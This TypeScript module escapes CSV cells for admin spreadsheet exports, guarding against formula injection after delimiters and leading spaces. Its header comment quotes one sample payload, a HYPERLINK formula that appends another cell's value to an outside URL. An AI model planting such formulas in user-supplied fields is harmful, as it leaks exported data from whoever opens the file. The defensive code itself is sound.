// lib/csv/spreadsheet-cell.ts — one cell writer for a CSV a person will open in
// a spreadsheet. Pure; used by the admin exports (components/admin/*-toolbar).
//
// Quoting a cell keeps its commas and quotes in; it does nothing about a cell a
// spreadsheet reads as a FORMULA. That is any cell that begins with = + - @, and
// a cell begins at the start of the value and — for Excel in the semicolon
// locales the app ships (de-DE, fr-FR, …) or a tab-splitting import — after any
// `;`, tab or line break inside it; a reader that trims may skip leading spaces
// first. Names, emails and family names are typed by users, so
// `=HYPERLINK("https://…?"&B2,"Open")` as a display name became a live link in an
// admin's export. An apostrophe at each of those places makes what follows text,
// the rule the support-ticket export applies to the first character
// (lib/admin/tickets-csv.ts, C1-S9-105) and the wallet statement to every one.

/** Text made safe to open in a spreadsheet. Only space and NBSP count as
 *  leading space: `\s` would swallow a tab and let the cell after it start with
 *  `=`. A value that starts with a tab or carriage return is prefixed too. */
export function spreadsheetText(value: string): string {
  const guarded = value.replace(/(^|[;\t\r\n])([ \u00a0]*)(?=[=+\-@])/g, "$1'$2");
  return /^[\t\r]/.test(guarded) ? `'${guarded}` : guarded;
}

/** One quoted CSV cell. Text is made safe to open; a number is written as it
 *  is, so a negative count stays a number a spreadsheet can sum. */
export function csvCell(value: string | number | null | undefined): string {
  const text = value == null ? '' : typeof value === 'number' ? String(value) : spreadsheetText(value);
  return `"${text.replace(/"/g, '""')}"`;
}

/** Rows (the header first) as CSV text, one line per row. */
export function csvDocument(rows: ReadonlyArray<ReadonlyArray<string | number | null | undefined>>): string {
  return rows.map((row) => row.map(csvCell).join(',')).join('\n');
}
